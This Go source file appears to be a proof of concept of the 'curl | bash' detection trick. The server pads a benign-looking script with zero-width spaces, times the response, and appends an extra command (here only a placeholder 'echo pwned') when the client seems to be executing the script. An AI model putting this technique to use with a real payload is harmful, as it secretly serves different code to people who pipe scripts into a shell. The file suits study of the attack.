package main

import (
	"net/http"
	"strings"
	"time"
)

func handler(w http.ResponseWriter, r *http.Request) {
	payload := []byte("echo 'This is an empty script that just sleeps'\nsleep 1\n#" + strings.Repeat("\xe2\x80\x8b", 1024*1024) + "\n")

	w.Header().Set("Content-Type", "text/plain; charset=UTF-8")
	w.WriteHeader(http.StatusOK)
	start := time.Now()
	w.Write(payload)
	end := time.Now()
	duration := end.Sub(start)
	if duration.Seconds() > 1 {
		w.Write([]byte("echo 'pwned'"))
	}
}

func main() {
	http.HandleFunc("GET /payload", handler)
	http.ListenAndServe("0.0.0.0:1111", nil)
}
